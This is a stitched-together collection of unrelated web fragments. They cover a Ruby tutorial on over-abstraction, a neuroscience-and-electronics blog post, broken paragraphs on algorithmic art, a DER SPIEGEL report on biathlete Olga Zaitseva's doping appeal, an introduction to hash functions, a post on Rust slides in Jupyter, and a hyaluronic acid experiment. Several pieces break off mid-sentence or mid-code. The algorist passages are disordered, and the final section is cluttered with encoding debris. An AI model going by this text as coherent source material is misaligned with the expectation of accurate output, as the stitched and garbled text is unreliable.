<p>Why is it a good idea to abstract the formula for a sphere's volume into its own method? Because if mathematicians ever found out they got the formula wrong, you would want to go through all the places in your code that you used the formula and update it to be correct. That is, we know ahead of time that we want the code to be in lockstep. This is as safe a gamble as you can get.</p>
<h3>Over-abstraction examples</h3>
<p>The main sign that you're over-abstracting is that your method accepts a bunch of optional args:</p>
<h4>Example: Bloated method</h4>
<h5>Bad:</h5>
<pre><code>def average(arr, type = Integer, ignore_nulls = false)
  if arr.any?(&amp;:nil?)
    if ignore_nulls
      arr = arr.compact
    else
      return nil
    end
  end

  if type == String
    arr = arr.map(&amp;:to_i)
  end

  arr.sum / arr.size
end

puts average([1,2,3])
=&gt; 2

puts average(['1','2','3'], String)
=&gt; 2

puts average(['1','2','3', nil], String, true)
=&gt; 2

puts average([1, 2, 3, nil], Integer, false)
=&gt; nil</code></pre>
<p>If you want to know how the <code>average</code> method behaves when you're dealing with an array of strings with no <code>nil</code> values, you have to read through the first if condition which has nothing to do with your use case before reaching the code that does. Likewise if you want to know how the <code>average</code> method behaves when the array contains either nils or integers, the second if condition is irrelevant, but you'll still need to read through that to understand how the whole thing works.</p>
<p>If each of the use cases came up dozens or hundreds of times, maybe then it would make sense to retain the abstraction, but when the number of optional arguments is roughly equal to the number of different use cases, chances are you've got the wrong abstraction.</p>
<h5>Good:</h5>
<pre><code>def average(arr)
  arr.sum / arr.size
end

puts average([1,2,3])
=&gt; 2

arr = ['1','2','3'].map(&amp;:to_i)
puts average(arr)
=&gt; 2

arr = ['1','2','3', nil].compact.map(&amp;:to_i)
puts average(arr)
=&gt; 2

arr = [1, 2, 3, nil]
if arr.any?(&amp;:nil?)
  puts nil
else
  puts average(arr)
end
=&gt; nil</code></pre>
<p>In this case we're not removing the abstraction altogether: we're just keeping the part that actually applies to all cases. Now understanding the logic of any one invocation of our <code>average</code> method is trivial.</p>
<p>We now have <code>.map(&amp;:to_i)</code> being duplicated whereas it only appeared once in the <code>Bad</code> alternative, but it's a small cost for a vast improvement.</p>
<p>Note that looking at the <code>Good</code> variant, it's clear that the behaviour is quite different from one use case to the next, but that is not at all clear in the <code>Bad</code> variant because the method calls all look so simple and it was anybody's guess how much code inside <code>average</code> applied to each use case.</p>
<p>This is why abstractions go bad over time: because as you expand the interface more and more, it becomes harder and harder to judge how appropriate the abstraction is to any given use case, and developers end up assuming that all that convoluted code is vaguely relevant to the majority of use cases when in fact it's not.</p>
<h4>Example: Awkward class</h4>
<h5>Bad:</h5>
<pre><code>class Shape
  def initialize(radius: nil, width: nil, type:)
    @radius = radius
    @width = width
    @type = type
  end

  def area
    case @type
    when :square
      @width ** 2
    when :circle
      (@radius ** 2) * Math::PI
    end
  end

  def perimeter
    case @type
    when :square
      @width * 4
    when :circle
      @radius * 2 * Math::PI
    end
  end

  def diameter
    case @type
    when :square
      nil
    when :circle

				<div>
			<p><span>I’m interested in the the way the brain works. </span></p>
<p><span>I have been from as far back as I remember. I naturally gravitated towards the </span><span><a href="https://en.wikipedia.org/wiki/Neuroscience">neuroscience</a></span><span> section without realizing what it was or why I was found myself there. I suspect it’s the combination of the study of the brain’s mysterious inner workings combined with a scientific methodology. I’ve casually dipped into Psychology and Behavior but it didn’t have the logic and neat explanations that I was used to in the sciences. I originally studied Electronic Engineering years ago, then coding and the design of technical solutions. I never considered how my knowledge of electronics could map to neuroscience but it turned out it does, quite nicely. In Electronics you learn the fundamentals of building small devices like current, resistance, voltage, and capacitance. This knowledge allows you to invent new machines or software. In Neuroscience you have those same principles but current is the flow of ions, voltage is in micro sizes and capacitance and resistance depend of the biology of our bodies. It’s the study of the ultimate machine – the human.</span></p>
<h4>The Human Body is the Best of Machines</h4>
<p><span>I signed up to the </span><span><a href="https://courses.edx.org/courses/course-v1:HarvardX+MCB80.1x+2T2020/course/">Harvard EdX – Fundamentals of Neuroscience Part 1</a></span><span> course. It’s free course but you can pay a small fee at the end for the certificate.</span><span><span>&nbsp; </span></span><span>The mathematical formulas got my brain grinding again, I felt a pang of nostalgia as I started plugging numbers into equations. In neuroscience you have to worry about a lot more than the physical mechanics. You’re dealing with liquid solutions that contain ions like Sodium or Potassium that surround the machinery and the complex arrangement of cells and their membranes. I noticed there was a shift from absolutes to probabilities. You can only be a percentage level sure that an action by a neuron would happen. In electronics we usually know for certain if all other parameters are constant. In the study of neuroscience I felt like I was discovering the blueprint of an impossibly complicated design of a machine. In electronics, I was learning about small building blocks that I could use to design new machines. It was humbling. </span></p>
<p><span>I would recommend the course if you have a physics or electronics background. For one, you’ll find it easy to understand the concepts. Two, you’ll be in awe of the way the human body works. And three, you will have a new understanding and appreciation of occasions where the body fails to work as intended e.g. </span><span><a href="https://www.nationalmssociety.org/What-is-MS">Multiple Sclerosis</a></span><span> which occurs when certain elements are damaged leading to the debilitating symptoms in the nerves.</span></p>
<h4>The Advances of Electronics + Neuroscience</h4>
<p><span>The intersection of electronics and neuroscience is not new but over recent years, advances in both fields have opened the door to some intriguing research. For example I came across </span><span><a href="https://www.tandfonline.com/doi/full/10.1080/23746149.2019.1664319">this research from last year on flexible electronics that can enable new types of neural implants to restore function in the human body</a></span><span>. Another </span><span><a href="https://theconversation.com/to-understand-the-brain-you-need-electronic-engineers-too-26104">article, although several years old now, puts forward the case for more electronic engineers in the field of neuroscience</a></span><span> to help make new discoveries in brain disorders and artificial intelligence. In particular, the idea of mimicking the design of real neuron behavior and applying that to the electronic circuits that power our devices. I recently read a book about patterns in nature that are remarkably similar throughout disciplines </span><span><a href="https://recknsense.com/natures-deep-design-of-the-mind/">‘A Beautiful Question: Finding Nature’s Deep Design’ by Frank Wilczek</a></span><span>. In the book, the author points out that many discoveries shared striking patterns of symmetry and balance. It stands to reason that the patterns we can identify in a human intelligent machine could lead us to design better machines – even if we don’t understand exactly how they work. Unlike our digital functioning machines, the patterns in neuroscience are analogue and less predictable. With our deeper understanding of quantum mechanics we are finding out that at a tiny, quantum level, the patterns are also less based on digital 1’s and 0’s. Somewhere, these two disciples should inevitably meet with the net effect of improving both.</span></p>
<p><span>Recently there has been some very exciting research that shows signs of doing that, specifically to improve the design of electronic devices. </span><span><a href="https://www.sciencedaily.com/releases/2020/04/200420084249.htm">The University of Massachusetts Amherst published a paper in April 2020 that explains the discovery of miniature tools (memristors) that operate like real brain synapses</a></span><span>. In this way the electronics mimic the human brain in efficient learning by being able to operate at very small voltage levels, much like the brain itself. This low power efficiency can open the doors for many possibilities including the notion that one day we could invent devices that ‘speak to’ real human neurons.</span></p>
<h4>The Future is Neuromorphic</h4>
<p><span>The study of mimicking brain neurons is called ‘</span><span><a href="https://en.wikipedia.org/wiki/Neuromorphic_engineering">Neuromorphic engineering</a></span><span>’ and is a pioneering field. You can read more about it here and find out why it is likely to trigger a revolution in engineering. This informative article goes into more detail on the analog nature of Neuromorphic engineering and the world changing applications that could be developed as a result. It also goes into a lot more detail on the technology.</span></p>
<p><span>The fundamentals of neuroscience course I took gave me a great introduction to a new field of study. But it also gave me an opportunity to refresh on some old knowledge while learning something new and to consider what this new combination of technologies could offer for the future. The real excitement though is the idea of taking the examples we discover within ourselves and using this as a guide to develop groundbreaking new technologies that could change everything. </span></p>

	artistic practice with form-generating features that is relatively unique to 
	the last quarter of the 20th Century. Computer power gives the artist's 
	algorithms a leverage we might liken to the power of the engine in the

	<p>I met other artists following the same path who were interested in an 
	identity for their algorithmic art practice. It was Jean Pierre Hebert (JPH) who suggested we adopt 
	the term "algorist" and he also wrote the algorithm for an <i>algorist.&nbsp; </i>This algorithm is now viewed as the "<i>algorist manifesto</i>"<i> </i>
	and it was JPH who led discussions and correspondence in establishing its 
	usage. <i>&nbsp;</i>While the practice of algorithmic art reaches back to 
	pre-historic basket-weaving and tool-making the implementation with 
	computing power provided new "form-generating" capabilities.</p>

		<p><span>Algorithmic art may be found throughout history, from prehistoric

		However,&nbsp; the advent of computers provide us with form-generating 
		leverage that, to the best of my knowledge, has no precedent in&nbsp; 
		the history of art. It is in&nbsp; this sense that algorist artists of 
		the late 20th Century pioneered procedures that have come to permeate

		<p>In the last quarter of the 20th Century I was one of a 
		like minded group of artists who undertook to write instructions for 
		executing our art.&nbsp; In the 1970's &amp; 80's&nbsp; "Computer art" was the term 
		generally applied to all art associated with computers.&nbsp; Some of us had been working with 
		algorithmic procedure for about a quarter century before our 1995 
		declaration as "algorists".&nbsp; The 1995 manifesto of the "algorists" 
		was not a declaration of something new; rather, it was giving identity 
		to an artistic practice that had already brought radical change and 
		would continue to change the way we would create art in&nbsp; the 21st 
		Century.&nbsp;The algorist adaptation provided a name for artists who 
		practiced algorithmic art.&nbsp; This practice also had a valuable presence in sculpture 
		and music. Helaman Ferguson would be a sculptor whose algorithmic art&nbsp; 
		celebrated an aesthetic rooted in mathematics.&nbsp; His "Four Canoes",

<p>Even today, more than five years after the end of her career, Olga Zaitseva says she doesn’t drink from water bottles if they have already been opened. Even when she visits friends, she says she always has a new one brought to her. "It’s an old habit,” she admits, before laughing softly.</p>

<p>Zaitseva, 42, has retained the quirk from her past life. The Russian with blonde curls and narrow eyes was once one of the world’s best biathletes, an Olympic champion. Her success put her in the near-constant sights of doping-control officers.</p><p>She took special precautions to make sure that she never consumed anything that was prohibited. "As an athlete, I was responsible for what went into my body, which is why I always carried my own water bottles with me,” she says. "That way I could make sure that no one slipped anything into it.” When Zaitseva ended her career in January 2015, after hundreds of competitions and countless doping tests, she was considered a clean athlete.</p>

<p><strong>Banned for Life</strong></p><p>In the coming days, three judges at the Court of Arbitration for Sport (CAS) in Lausanne, Switzerland, will determine whether that claim still holds true. In 2017, the International Olympic Committee (IOC) banned the Russian athlete for life over violations of anti-doping regulations. The IOC claimed Zaitseva had profited from a system of fraud that concealed massive Russian doping at the 2014 Winter Olympics in Sochi at the behest of the government.</p><p>Zaitseva says she has "never, ever, ever, ever, ever” doped in her life, "and if I have to, I will gladly repeat that a million times.” Zaitseva appealed the decision together with two other female athletes who were also banned by the IOC.</p>

<p>On the surface, the proceedings seem like just another chapter in the endless Russian doping scandal that has gripped the sporting world for more than five years now. But the credibility of the most important key witness to the mass fraud is on the line, and if the court sides with the Russian athletes, it could trigger a domino effect, given that other cases are still pending. The three biathletes also filed a $30-million (27-million-euro) lawsuit in New York against Russia’s former anti-doping laboratory director, who lives in hiding in the United States. In their suit, they claim they are the victims of defamation and that their names, victories and honors have been vilified for no reason.</p>

<p>Several pieces of evidence in the files from the Swiss proceedings that DER SPIEGEL has viewed in recent weeks seem not only to substantiate Zaitseva’s claims of innocence, they also appear to raise questions about the overall credibility of the investigation into the Sochi conspiracy and whether too much faith was placed in the account provided by the whistleblower in the scandal.</p><p><strong>An Old Conflict Flares Up Again</strong></p><p>The case has long been a political issue. In recent years, forensic scientists and special investigators have been poring over urine samples and scientific evaluations in hopes of a resolution, and parliaments and heads of state have either condemned or categorically denied Russia’s systemic fraud. It has rekindled a conflict between East and West and between hopelessly overburdened sporting associations.</p><p>What is certain is that many Russian athletes have been cheating the system. Russia’s track and field federation has been suspended from international competitions since 2015. In 2019, the World Anti-Doping Agency (WADA), recommended the Russian flag and national anthem be banned from the Olympic Games and other major events for four years in response to the tricks used by Moscow in its efforts to hinder the investigation into the doping scandal.</p>
</div>

<div>
<p>This includes events that allegedly took place in Sochi. What is known about them is largely attributable to the descriptions and records of a key witness: Grigory Rodchenkov, 61. The chemist headed Russia’s national anti-doping laboratory until 2015, when he moved to the United States. There, he shared his account of what allegedly happened in Sochi with the <em>New York Times</em>. In his version of events, the urine of Russian medal candidates contaminated with banned substances at the Winter Games were secretly swapped with clean urine, presumably with the help of Russia’s secret service, the FSB. Rodchenkov has led such an exuberant life that Netflix even made the two-hour documentary film "Icarus” about it.</p><p>WADA appointed a special investigator, and subsequent analyses of Russian urine samples from Sochi revealed indications of urine tampering. Ultimately, the IOC felt the circumstantial evidence was strong enough to sanction the athletes. In several affidavits, Rodchenkov provided the names of athletes who were allegedly doped in Sochi and presented lists of competitors who, he claimed, were provided with protection by the Sports Ministry. Three years ago, this led the IOC to sanction 43 athletes and remove them from the results lists of the Sochi Olympics.</p><p>Almost all of those cases were appealed, and 28 were successful in getting the decision overturned. The decisions to reverse the sanctions were made due to insufficient evidence. Three rulings are still pending - the one for Zaitseva and the other two biathletes.</p><p><strong>A "Made-Up Story”</strong></p><p>Zaitseva claims that Rodchenkov’s portrayal of events is a "made-up story.” In a video call from Moscow, she says she has never seen him in her life. So why does he mention her explicitly in documents, in one case even describing a meeting with her? "I have no explanation for all these lies,” Zaitseva says, "except that he must be crazy.”</p><p>Rodchenkov claims that Zaitseva doped using EPO, a blood booster, and that, like many Russian medal candidates, she was given what was called the "Duchess cocktail,” a mixture of three anabolic steroids.</p><p>"None of it is true," says Zaitseva.</p><p>Wolfgang Pichler also believes the story about "this cocktail is total rubbish.” The Bavarian is considered one of the world’s best biathlon coaches and known as a champion of doping-free sports. After German reunification, he campaigned against the German Ski Association accepting former East German coaches who had been suspected of involvement in the regime’s doping programs. In 2009, he also demanded the exclusion of Russian biathletes from the Olympic Games following doping revelations. Then he became Russia’s head coach in 2011, and later took over a five-person training group that included Zaitseva.</p>
</div>

<div>
<p>The main training center was set up in Pichler’s hometown of Ruhpolding. Most of the other training camps also took place in Europe. "We were almost entirely under WADA’s control,” Pichler says. He also took blood from his charges each day of training to determine stress limits. If one of his charges had doped, he says he would have noticed.</p><p>But what about the cocktail? "A pipe dream,” Pichler claims. The coach says he said the very same thing during a hearing in Lausanne, Switzerland.</p><p>Four doping samples were taken from Zaitseva at Sochi – three urine and one blood. During follow-up analyses, investigators argued that the salt concentration in a urine sample was too high.</p><p><strong>Natural Cause Could not Be Ruled Out</strong></p><p>But experts believed that wasn’t enough to suggest the sample had been tampered with. Two expert opinions, including one from a renowned New York institute, were submitted during the Lausanne proceedings. Both stated that a natural cause for Zaitseva's salt value could not be ruled out. Zaitseva says she has always had a high-sodium diet, with lots of smoked salmon and red caviar, which were also served at the cafeteria in the Olympic Village.</p><p>The IOC re-examined Zaitseva’s blood sample, with negative results. If Zaitseva had cheated, they ought to have found traces of EPO- or anabolic doping. Unlike the urine samples, the blood samples at the Olympics were never secretly swapped.</p><p>Rodchenkov's statements about Zaitseva reach beyond Sochi. He claims, for example, that the biathlete ended her career at the end of 2014 by order of the Sports Ministry, because her blood values hadn’t normalized. Zaitseva did in fact announce her resignation in January 2015. "I was pregnant,” she says, nothing else. Her second son was born that October.</p>

<p>The test results from another urine sample the IOC introduced as evidence in the proceedings against Zaitseva also fall into this context. The sample is from October 2014 and contains DNA from two people – Zatiseva’s and, it would later be revealed, from a man. The IOC investigators considered this to be further evidence of fraud.</p><p>Zaitseva says she was shocked when she found out about it. "How do you think it feels to have to tell your husband that male DNA was found in your urine? That story could have destroyed my family.” It took years to identify the foreign DNA. According to the forensic reports viewed by DER SPIEGEL, it came from Zaitseva’s husband. They say the couple likely had sex shortly before the doping test.</p><p><strong>"It’s Like Getting Accused of Murder”</strong></p><p>Zaitseva says yes, she was trying to get pregnant at the time. She says the proceedings destroyed her reputation. "It’s like getting accused of murder, even though you haven’t hurt anyone,” she says.</p><p>She fought back, along with the other biathletes who had been accused of doping, and filed a lawsuit against Rodchenkov in New York. Mikhail Prokhorov, a man as glamorous as he is influential, is covering some of the costs of the women’s suit. The Russian billionaire is the former president of the Russian Biathlon Association and was the owner of the Brooklyn Nets NBA basketball team, among others.</p><p>The proceedings in the New York case are currently in recess. Both sides have agreed to wait for the outcome of the CAS ruling. The Russian side is counting on a reversal of the sanctions in Lausanne, which they believe could shift the lawsuit …</p></div></div></div>

<p>This is going to be a basic introduction to hash functions. I will assume most of my audience is here to gain an understanding of why hash functions are used and the basic idea of why they work. My goal is to explain it in a general sense, I will be omitting proofs and implementation details and instead focusing on the high-level principles.</p>







<p>Hash functions are used all over the internet in order to securely store passwords, find duplicate records, quickly store and retrieve data, and more. For example,&nbsp;<a href="https://qvault.io/" target="_blank" rel="noreferrer noopener">Qvault</a>&nbsp;uses hashes to extend master passwords into private encryption keys.</p>



<p><em>A longer list of uses here:&nbsp;</em><a href="https://en.wikipedia.org/wiki/Hash_function#Uses" target="_blank" rel="noreferrer noopener"><em>https://en.wikipedia.org/wiki/Hash_function#Uses</em></a></p>



<p>I want to focus on several important features of hash functions, arguably the most important features.</p>



<ul>
<li>Hash functions scramble data deterministically</li>
<li>No matter the input, the output of a hash function always has the same size</li>
<li>The original data can not be retrieved from the scrambled data (one-way function)</li>

<p>I start with the cube unscrambled. If I start twisting randomly, by the end I will end up with something that does not resemble anything close to what I started with. Also, if I were to start over and do the exact same series of moves, I would be able to repeatedly get the exact same outcome. Even though the outcome may<em>&nbsp;appear&nbsp;</em>random, it isn’t at all. That is what&nbsp;<strong>deterministic&nbsp;</strong>means.</p>



<p>Determinism is important for securely storing a password. For instance, let’s pretend my password is “iLoveBitcoin”</p>



<p>I can use a hash function to scramble it:</p>



<blockquote><p>iLoveBitcoin → “2f5sfsdfs5s1fsfsdf98ss4f84sfs6d5fs2d1fdf15”</p></blockquote>



<p>Now, if anyone were to see the scrambled version, they wouldn’t know my original password! This is important because it means that as a website developer, I only need to store the hash (scrambled data) of my user’s password to be able to verify them. When the user signs up, I hash the password and store it in my database. When the user logs in, I just hash what they typed in and compare the two hashes. Because a given input always produces the same hash, this works every time.</p>

<p>If I hash a single word the output will be a certain size (in the case of SHA-256, a particular hashing function, the size is 256 bits). If I hash a book, the output will be&nbsp;<em>the same size</em>.</p>



<p>This is another important feature because it can save us computing time. A classic example is using a hash as a key in a data map. A data map is a simple structure used in computer science to store data.</p>







<p>When a program stores data in a map, a key and value are given to the map. When a program wants to access the value, it can give the appropriate key to the map and receive the corresponding value. Data maps are good because they can find data&nbsp;<em>instantly.&nbsp;</em>The key is used as an address that the computer can find immediately, instead of taking hours searching through millions of records.</p>



<p>Because keys are like addresses, they can’t be too large. If I want to store books in a data map I can hash the contents of the book and use the hash as a key. As a programmer, I can simply use the hash to look up the contents of the book instead of trying to sort through thousands of records by title, author, etc.</p>







<p>Here is the real challenge of writing this article. I’m going to keep it extremely simple and omit the actual implementation details while giving you a basic idea of what the computer actually does when it hashes some data.</p>



<p>Let’s walk through an example algorithm I’m making up on the fly for this demonstration,&nbsp;<strong>LANEHASH:</strong></p>



<ul><li>We start with some data to hash</li></ul>
<blockquote><p>iLoveBitcoin</p></blockquote>



<ul><li>I convert the letters and numbers into 1’s and 0’s (All data in computers are stored in 1’s and 0’s, different patterns of 1’s and 0’s represent different letters)</li></ul>
<blockquote><p>iLoveBitcoin→ 100010100000101111</p></blockquote>



<ul>
<li>At this point we go through various predetermined steps to transform our data. The steps can be anything, the important thing is that whenever we use LANEHASH we need to use the same steps so that our algorithm is deterministic.</li>
<li>We move the first four bits from the left side to the right</li>
</ul>
<blockquote><p><strong>1000</strong>10100000101111 → 10100000101111<strong>1000</strong></p></blockquote>



<ul><li>We separate every other bit</li></ul>
<blockquote><p><strong>1</strong>0<strong>1</strong>0<strong>0</strong>0<strong>0</strong>0<strong>1</strong>0<strong>1</strong>1<strong>1</strong>1<strong>1</strong>0<strong>0</strong>0 → 110011110 &amp; 000001100</p></blockquote>



<ul><li>We convert those two parts into base 10 numbers. Base 10 is the “normal” number system that we all learned in school. (all binary data really just number, you can look up how it converts binary to base 10 easily online elsewhere)</li></ul>
<blockquote>
<p>110011110 → 414</p>
<p>000001100→ 12</p>
</blockquote>



<ul><li>We multiply the two numbers together</li></ul>
<blockquote><p>414 *12 = 4968</p></blockquote>



<ul><li>We square that number</li></ul>
<blockquote><p>4968 ^ 2 = 24681024</p></blockquote>



<ul><li>We convert that number back to binary</li></ul>
<blockquote><p>24681024 →1011110001001101001000000</p></blockquote>



<ul><li>We chop 9 bits off the right side to get exactly 16 bits</li></ul>
<blockquote><p>1011110001001101<strong>001000000</strong>&nbsp;→ 1011110001001101</p></blockquote>



<ul><li>We convert that binary data back to English</li></ul>
<blockquote><p>1011110001001101&nbsp;→ “8sj209dsns02k2”</p></blockquote>



<p>As you can see, if you start with the same word at the beginning, you will always get the same output at the end. However, if you even change one letter, the outcome will be drastically changed.</p>







<p>On the steps where I convert from English to binary, and from binary to English, I followed no pattern. Don’t let that confuse you. There are many different ways to convert binary data to English and back, I just didn’t want to get hung up on that in this article. Here are some references on that subject:</p>

            <section>
                <div>
                    <p>I sometimes give talks at the <a href="https://oradeatechhub.ro/">local tech hub</a> in the city where I live. It's not a big community, but I enjoy giving talks and they often provide a necessary deadline and motivation to finish some projects. </p><p>Last week I gave a talk about Rust. Given that there are still some restrictions on how many people get be in one room, the physical audience was only 10 people, but there was a livestream as well. </p><p>Until now, I had used Google Slides for my presentation. For talks that don't have a lot of code, it works fine. But when you are presenting lots of code (such as a tutorial for a programming language), I found Slides to be lacking. If you paste in the code directly, you can't have syntax highlighting. You can paste in a screenshot, but then any later modifications to the slide mean retaking the screenshot and replacing it, so it's more work.</p><p>You can present in an IDE, but sometimes you want to have slides with normal text between pieces of code, where you explain some things. Switching between two apps can quickly get annoying. Also, it's hard to prepare just "bite-sized" content in an IDE, but that is needed so that the audience is focused only on what you are explaining right now. </p><p>So I decided to try something new for my intro to Rust presentation: I used Jupyter Notebook with a several extensions and I think it worked pretty well (except for a bug towards the end of the presentation). </p><p>For this I used the <a href="https://rise.readthedocs.io/en/stable/support.html">RISE extension</a>, which adds live slide show support to Jupyter, using <code>reveal.js</code>. Each cell can be either a new slide, a sub-slide (so to get to it you have to "navigate down", in reveal.js style), a fragment (so it shows up on the same slide, but on a subsequent click), or notes. You can write new code and run it even during slideshow mode, so it's very useful if someone in the audience has a question, you can quickly write down and execute code to answer them. RISE is simple to install:</p><pre><code>&gt; pip install RISE
</code></pre><p>Then I used a bunch of extenstions that are bundled together in the <code><a href="https://jupyter-contrib-nbextensions.readthedocs.io/en/latest/install.html">jupyter_contrib_nbextensions</a></code> package. By default, you have to enable and configure them by editing JSON files, but there is another plugin to add a dashboard for them, called <code><a href="https://github.com/Jupyter-contrib/jupyter_nbextensions_configurator">jupyter_nbextensions_configurator</a></code>. They can be installed with:</p><pre><code>&gt; pip install jupyter_contrib_nbextensions
&gt; jupyter contrib nbextension install --user
&gt; pip install jupyter_nbextensions_configurator
&gt; jupyter nbextensions_configurator enable --user</code></pre><p>You have to restart the Jupyter process and now you will see a new tab on the home page of the local Jupyter page, where you can enable and configure all the installed extensions. </p><figure><img src="https://rolisz.ro/content/images/2020/07/image.png"></figure><p>I used the "Hide input" extension. Most of my code was organized into two cells. One which didn't contain all the code, just a snippet on which I wanted to focus (for example, I made a small change to a previously defined function), and another one which could be run and showed output. The latter cell was hidden with this extension, so that only the output could be seen. </p><figure><div><div><p><img src="https://rolisz.ro/content/images/2020/07/hiddencell.png" width="3634" height="1657"></p><p><img src="https://rolisz.ro/content/images/2020/07/revealed_cell.png" width="2082" height="1657"></p></div></div><figcaption>Left: snippet cell and output of hidden cell in slide view. Right: snippet cell, revealed hidden cell and it's output in notebook view</figcaption></figure><p>Initially I also used the "Split cell" extension. This extension gives you a button which can make a cell to be half width. If two consecutive cells are half width, they align next to each other, making two columns. I wanted to use this to have code on the left column and explanations on the right column. This would have worked if the presentation was online only, because I wouldn't have had to zoom in too much. But because in the last week before the presentation we found out that it was allowed to hold the presentation in person (with 10 people in the audience) and I had to present on a projector and zoom in, I ended up removing all the split cells because the content wouldn't fit in any longer. </p><h2 id="making-rust-work-with-jupyter">Making Rust work with Jupyter</h2><p>All the above is generic and can be made to work with anything that works in Jupyter. To make Rust work in Jupyter you need a kernel for it.

    <p>By Wendy Ouriel</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>




<p>How do you know if someone is a vegan, a runner, or bought a house in Malibu in 1970 for $15Â&nbsp;and it's now worth $40 million? Because they'll tell you. You can also count that if a skin care company uses hyaluronic acid they will tell you thatÂ&nbsp;it holds 1000x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>Well IÂ&nbsp;put that ad nauseam claim to the test. And I found that hyaluronic acid does not hold 1000x its weight in water. It doesn't hold 500x its weight in water, it doesn't even hold 100x its weight in water. I found that hyaluronic acid only holds about 10-50x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp;Â&nbsp;</p>






<p>PerhapsÂ&nbsp;more egregious than the thoroughly false claim, is that there is not a clear-cut way to determine how much hyaluronic acid actually absorbs, which is why I could only give a range of 10-50x in my results. Hyaluronic acid forms a gel when saturated, but there is not a subjective way to determine when that "gel" is fully saturated, and thus you cannot weigh the fully saturated gel to determine how much water was absorbed. I expected that I could filter the fully saturated gel from the water that wasn't absorbed, weigh it, and determine how much water was absorbed by the hyaluronic acid. I was not able to do that because the gel varied in thickness, or just changed the thickness of the water to such a slight degree it wasn't measurable.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>I used hyaluronic acid of varying sizes to determine if there was a variation in the absorbency based on theÂ&nbsp;mass of the molecule. Hyaluronic acid is measured in daltons. Daltons areÂ&nbsp;used to measure something very low in mass, on the atomic level. 1 dalton = 0.00000000000000000000000166054 grams.Â&nbsp; Â&nbsp; Â&nbsp;</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;Â&nbsp;</p>








<p>There was also a high degree of variation between the absorbency for hyaluronic acid depending on the molecular weight. High molecular weight, low molecular weight, and super low molecular weight had a similar absorbencies, butÂ&nbsp;ultra low molecular weight was barely able toÂ&nbsp;hold onto any water at all.Â&nbsp;</p>

<h4>Materials used in this experiment:</h4>

